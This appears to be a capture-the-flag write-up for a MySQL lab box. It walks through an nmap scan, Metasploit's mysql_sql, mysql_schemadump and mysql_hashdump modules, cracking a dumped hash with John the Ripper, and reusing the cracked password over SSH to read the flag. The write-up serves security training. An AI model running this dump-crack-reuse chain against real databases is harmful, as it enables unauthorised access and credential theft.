# SQL (Structured Query Language)

- [Understanding](#understanding)
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
    - [Scan](#scan)
    - [Results](#results)
    - [Observations](#observations)
- [Exploitation](#exploitation)

# Understanding

- What is SQL?
  SQL is a Relational Database Management System (RDBMS) based on Structured Query Language (SQL)
- What's a database?
  A Database is a persistent and organized collection of structured data.
- RDBMS?
  A software or service used to create and manage databased based on a relational model. Relations just means that the data stored in the dataset is organized as tables. Every table relates in some way to each other's primary key or other key factors.
- SQL?
  MySQL is just a brand name for one of the most popular RDBMS software implementations. Is used a client-server model. Both the client and the server communicate using a language called SQL.
- How does MySQL Work?
  MySQL as a RDBMS is made up of the server and utility programs that help manage the SQL database. The server handles all database instruction like creating, editing, and accessing data. It takes and manages these requests and communicates using the MySQL protocol. This protocol can be broken down into 3 stages.

  1. My SQL creates a database for storing and manipulating data, defining the relationship of each table.
  1. Clients make requests by making specific statements in SQL.
  1. The server will respond to the client with whatever information has been requested.

- What runs MySQL?
  MySQL can be ran on various platforms. It's commonly used as a back end database for many prominent websites and forms an essential component of the LAMP stack which includes Linux, Apache, MySQL, and PHP.

# Enumeration

- In this challenge, we were already given a piece of information: credentials **root:password**

## Nmap

#### Scan

```bash
nmap -v -sV -A -oN sql-short 10.10.144.194
```

#### Results

```bash
# Nmap 7.60 scan initiated Fri May 14 18:53:47 2021 as: nmap -v -sV -A -oN sql-short 10.10.144.194
Host is up (0.00068s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 06:36:56:2f:f0:d4:a4:d2:ab:6a:43:3e:c0:f9:9b:2d (RSA)
|   256 30:bd:be:28:bd:32:dc:f6:ff:28:b2:57:57:31:d9:cf (ECDSA)
|_  256 f2:3b:82:4a:5c:d2:18:19:89:1f:cd:92:0a:c7:cf:65 (EdDSA)
3306/tcp open  mysql   MySQL 5.7.29-0ubuntu0.18.04.1
| mysql-info:
|   Protocol: 10
|   Version: 5.7.29-0ubuntu0.18.04.1
|   Thread ID: 4
|   Capabilities flags: 65535
|   Some Capabilities: IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, IgnoreSigpipes, SupportsCompression, Speaks41ProtocolNew, SupportsTransactions, Support41Auth, InteractiveClient, SupportsLoadDataLocal, LongColumnFlag, ConnectWithDatabase, Speaks41ProtocolOld, SwitchToSSLAfterHandshake, LongPassword, ODBCClient, FoundRows, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: ,9lY	:\x05\x05z^\x026o~Q\x0BNC\x04g
|_  Auth Plugin Name: 96
MAC Address: 02:34:C7:BD:BE:AB (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=5/14%OT=22%CT=1%CU=32020%PV=Y%DS=1%DC=D%G=Y%M=0234C7%T
OS:M=609EB93C%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A
OS:)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M23
OS:01ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
OS:WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=
OS:F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
OS:)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=
OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 28.017 days (since Fri Apr 16 18:29:32 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.68 ms ip-10-10-144-194.eu-west-1.compute.internal (10.10.144.194)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 14 18:54:04 2021 -- 1 IP address (1 host up) scanned in 17.26 seconds
```

#### Observations

- 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
- 3306/tcp open mysql MySQL 5.7.29-0ubuntu0.18.04.1
  > | mysql-info:
  > | Protocol: 10
  > | Version: 5.7.29-0ubuntu0.18.04.1

## Connecting?

1. Now that we have a set of credentials and can verify that the service is running, let's check by manually connecting to the MySQL server.

1. Command: mysql -h _IP_ -u _username_ -p
   > sudo apt install default-mysql-client
1. Now that we're able to connect with the provided credentials, we can launch metasploit.

## Metasploit mysql_sql

The mysql_sql module performs SQL queries on a remote server when provided with a valid set of credentials.

1. After searching for the _mysql_sql_ module, we see that there are 3 options that we need to set.
   1. Password
   1. RHOSTS
   1. Username
2. After running the exploit, we can see that the auxiliary scanner also grabbed the version like we received in the nmap scan.

   ```bash
   msf5 auxiliary(admin/mysql/mysql_sql) > run
   [*] Running module against 10.10.144.194

   [*] 10.10.144.194:3306 - Sending statement: 'select version()'...
   [*] 10.10.144.194:3306 -  | 5.7.29-0ubuntu0.18.04.1 |
   [*] Auxiliary module execution completed
   ```

3. Next, under options, we can change the **SQL** query to **show databases**.

   ```bash
   msf5 auxiliary(admin/mysql/mysql_sql) > set SQL show databases
   SQL => show databases
   msf5 auxiliary(admin/mysql/mysql_sql) > options

   Module options (auxiliary/admin/mysql/mysql_sql):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  password         no        The password for the specified username
   RHOSTS    10.10.144.194    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     3306             yes       The target port (TCP)
   SQL       show databases   yes       The SQL to execute.
   USERNAME  root             no        The username to authenticate as

   msf5 auxiliary(admin/mysql/mysql_sql) > run
   [*] Running module against 10.10.144.194

   [*] 10.10.144.194:3306 - Sending statement: 'show databases'...
   [*] 10.10.144.194:3306 -  | information_schema |
   [*] 10.10.144.194:3306 -  | mysql |
   [*] 10.10.144.194:3306 -  | performance_schema |
   [*] 10.10.144.194:3306 -  | sys |
   [*] Auxiliary module execution completed
   ```

4. Here, we can see that there are 4 databases returned to us.

# Exploitation

## Information

So far we have:

- MySQL Server credentials
- The MySQL version that's running
- The number of Databases and their names.

## Key Terms:

- Schema: Synonymous with database. In MySQL, these two can be interchanged where as other database products draw a distinction.
  ```sql
  CREATE SCHEMA
  CREATE DATABASE
  ```
- Hashes: The product of a cryptographic algorithm to turn a variable length input into a fixed length output. In MySQL, hashes can be used in different ways like indexing data into a hash table. Each hash has a unique ID rhat serves as a pointer to the origional data. This creates an index that is significitanly smaller than the origional data allow the calues to be searches and accessed more efficiently.

## Metasploit

### mysql_schemadump

This module extracts the schema information from a MySQL DB server.

> auxiliary/scanner/mysql/mysql_schemadump

1. From here, we will search, use, and set the proper options.
2. Then we run the exploit. The following is a snipit of the output
   ```sql
   .
   .
   .
   - TableName: x$waits_global_by_latency
       Columns:
       - ColumnName: events
       ColumnType: varchar(128)
       - ColumnName: total
       ColumnType: bigint(20) unsigned
       - ColumnName: total_latency
       ColumnType: bigint(20) unsigned
       - ColumnName: avg_latency
       ColumnType: bigint(20) unsigned
       - ColumnName: max_latency
       ColumnType: bigint(20) unsigned
   ```

### mysql_hashdump

This module extracts the usernames and encrypted password hashes from a MySQL server and stores them for later cracking.

1. From here, we will search, use, and set the proper options.
2. Then we run the exploit. The following is a snipit of the output
   ```bash
   [+] 10.10.144.194:3306    - Saving HashString as Loot: root:
    [+] 10.10.144.194:3306    - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
    [+] 10.10.144.194:3306    - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
    [+] 10.10.144.194:3306    - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
    [+] 10.10.144.194:3306    - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
    [+] 10.10.144.194:3306    - Saving HashString as Loot: carl:*EA031893AA21444B170FC2162A56978B8CEECE18
    [*] 10.10.144.194:3306    - Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
   ```
3. as a result, we have another non-standard user name: **carl**

### John

1. Now that we have the hash, we can use JTR to find the password. Save the last hash into a file and try to crack it.
   ```bash
   root@ip-10-10-16-49:~/sql/nmap# john hash
   Warning: detected hash type "mysql-sha1", but the string is also recognized as "mysql-sha1-opencl"
   Use the "--format=mysql-sha1-opencl" option to force loading these as that type instead
   Using default input encoding: UTF-8
   Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 256/256 AVX2 8x])
   Warning: no OpenMP support for this hash type, consider --fork=2
   Proceeding with single, rules:Single
   Press 'q' or Ctrl-C to abort, almost any other key for status
   Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
   Almost done: Processing the remaining buffered candidate passwords, if any.
   Proceeding with wordlist:/opt/john/password.lst
   Proceeding with incremental:ASCII
   doggie           (carl)
   1g 0:00:00:01 DONE 3/3 (2021-05-14 19:53) 0.6250g/s 1428Kp/s 1428Kc/s 1428KC/s doggie..doggia
   Use the "--show" option to display all of the cracked passwords reliably
   Session completed.
   ```
1. Chances are that this user has re-used this password as their SSH credentials.

   ```bash
   ssh carl@10.10.x.x
   cat MySQL.txt
   THM{congratulations_you_got_the_mySQL_flag}
   ```
